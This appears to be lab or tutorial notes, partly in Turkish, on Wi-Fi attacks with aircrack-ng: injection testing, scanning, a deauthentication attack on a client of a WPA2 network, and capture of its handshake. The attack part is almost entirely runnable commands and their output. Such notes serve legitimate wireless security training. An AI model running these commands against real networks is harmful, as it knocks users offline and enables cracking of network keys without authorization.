# Aireplay-ng

## Testing Packet Injection

```sh
my@attack:~$ sudo aireplay-ng --test wlp0s20f0u3mon
```

```output title="Output" hl_lines="2"
14:45:07  Trying broadcast probe requests...
14:45:07  Injection is working!
14:45:09  Found 1 AP

14:45:09  Trying directed probe requests...
14:45:09  D8:D6:3A:EB:29:D4 - channel: 1 - 'HackTheBox'
14:45:09  Ping (min/avg/max): 0.111ms/1.012ms/4.722ms Power: -29.00
14:45:09  30/30: 100%
```

## Scanning

```sh
my@attack:~$ sudo airodump-ng wlp0s20f0u3mon --write results
```

```output title="Output" hl_lines="10"
 CH  9 ][ Elapsed: 1 min ][ 2025-04-21 15:01

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3A:EB:29:D4  -28       73        0    0  11   54   WPA2 CCMP   PSK  HackTheBox
 D8:D6:3D:EB:29:D5  -47       77       30    0   1   54   WPA2 CCMP   PSK  CyberNet-Secure

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  EE:97:33:98:DC:ED  -29    0 - 1      0       12
 D8:D6:3D:EB:29:D5  96:48:DC:19:DF:3C  -29    0 - 1      0       16
 D8:D6:3D:EB:29:D5  3A:0C:3B:5F:9F:42  -29    1 - 1      0       16
 D8:D6:3D:EB:29:D5  E2:F6:D7:AC:C3:45  -29    0 - 1      0       23
```

## Deauthentication Attack

!!! failure

    Saldırı sırasında aşağıdaki hata alınabilir:

    ```output title="Output"
    16:55:12  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 3
    16:55:14  wlp0s20f0u3mon is on channel 3, but the AP uses channel 1
    ```

    Tarama, erişim noktasına ait kanal üzerinde başlatılır ise bu hata ortadan kalkabilir:

    ```sh
    my@attack:~$ sudo airodump-ng wlp0s20f0u3mon --write results --channel 1
    ```

```sh
my@attack:~$ sudo aireplay-ng --deauth 5 -a D8:D6:3D:EB:29:D5 -c EE:97:33:98:DC:ED wlp0s20f0u3mon
```

```output title="Output"
15:01:40  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
15:01:40  Sending 64 directed DeAuth (code 7). STMAC: [EE:97:33:98:DC:ED] [27|59 ACKs]
15:01:41  Sending 64 directed DeAuth (code 7). STMAC: [EE:97:33:98:DC:ED] [ 2|52 ACKs]
15:01:41  Sending 64 directed DeAuth (code 7). STMAC: [EE:97:33:98:DC:ED] [ 0|72 ACKs]
15:01:42  Sending 64 directed DeAuth (code 7). STMAC: [EE:97:33:98:DC:ED] [ 0|66 ACKs]
15:01:42  Sending 64 directed DeAuth (code 7). STMAC: [EE:97:33:98:DC:ED] [ 0|62 ACKs]
```

## Captured Handshake

```sh
my@attack:~$ sudo airodump-ng wlp0s20f0u3mon --write results
```

```output title="Output" hl_lines="1 10"
 CH  9 ][ Elapsed: 1 min ][ 2025-04-21 15:01 ][ WPA handshake: D8:D6:3D:EB:29:D5

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3A:EB:29:D4  -28       73        0    0  11   54   WPA2 CCMP   PSK  HackTheBox
 D8:D6:3D:EB:29:D5  -47       77       30    0   1   54   WPA2 CCMP   PSK  CyberNet-Secure

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  EE:97:33:98:DC:ED  -29    0 - 1    212      145
 D8:D6:3D:EB:29:D5  96:48:DC:19:DF:3C  -29    0 - 1      0       16
 D8:D6:3D:EB:29:D5  3A:0C:3B:5F:9F:42  -29    1 - 1      0       16
 D8:D6:3D:EB:29:D5  E2:F6:D7:AC:C3:45  -29    0 - 1      0       23
```
